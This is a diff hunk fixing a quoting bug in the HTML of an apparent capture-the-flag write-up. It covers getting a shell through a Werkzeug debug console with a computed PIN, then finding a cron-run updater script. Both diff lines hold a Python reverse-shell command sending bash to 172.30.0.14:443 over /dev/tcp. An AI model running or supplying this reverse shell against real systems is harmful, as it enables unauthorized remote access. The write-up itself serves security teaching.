@@ -202,7 +202,7 @@ h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span>
 <span style="color:#66d9ef">print</span>(rv)
 </code></pre></div><p>The PIN generated for my instance was <code>520-633-406</code>. With access to python console, I could easily get reverse shell.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
-os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;bash -c &#39;bash &gt;&amp; -i /dev/tcp/172.30.0.14/443 0&gt;&amp;1&#39;)</span>
+os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;bash -c &#39;bash &gt;&amp; -i /dev/tcp/172.30.0.14/443 0&gt;&amp;1&#39;&#34;</span>)
 </code></pre></div><p>Container had few processes running. One of them was cron. Quick glance on <code>/etc/crontab</code> showed that there was some bash script executed every minute.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joyhopkins@8f4ccaf7cf86:~/project/Uploads/zip$ cat /usr/bin/updater
 <span style="color:#75715e">#!/bin/bash</span>
